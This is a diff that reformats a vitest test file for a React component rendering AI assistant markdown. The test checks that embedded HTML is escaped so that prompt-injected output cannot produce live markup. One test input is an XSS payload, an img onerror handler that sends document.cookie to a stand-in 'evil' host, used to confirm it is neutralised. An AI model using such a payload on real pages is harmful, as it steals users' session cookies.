@@ -2,14 +2,17 @@ import { expect, test, describe } from 'vitest'
 import { renderToStaticMarkup } from 'react-dom/server'
 import { AssistantMarkdown } from './AssistantMarkdown.jsx'
 
-const render = (md) => renderToStaticMarkup(<AssistantMarkdown>{md}</AssistantMarkdown>)
+const render = (md) =>
+  renderToStaticMarkup(<AssistantMarkdown>{md}</AssistantMarkdown>)
 
 // AI output is untrusted: disableParsingRawHTML must turn any embedded HTML
 // into literal text, so prompt injection can never produce live markup, while
 // genuine markdown still renders.
 describe('AssistantMarkdown', () => {
   test('renders markdown constructs', () => {
-    const html = render('# Title\n\n## Sub\n\n**bold** and `code`\n\n- item\n\n1. first')
+    const html = render(
+      '# Title\n\n## Sub\n\n**bold** and `code`\n\n- item\n\n1. first',
+    )
     expect(html).toContain('<h1')
     expect(html).toContain('<h2')
     expect(html).toContain('Title')
@@ -25,7 +28,9 @@ describe('AssistantMarkdown', () => {
   })
 
   test('does not emit a live <img> for an onerror payload', () => {
-    const html = render('<img src=x onerror="fetch(`//evil/?c=`+document.cookie)">')
+    const html = render(
+      '<img src=x onerror="fetch(`//evil/?c=`+document.cookie)">',
+    )
     expect(html).not.toContain('<img')
   })
 
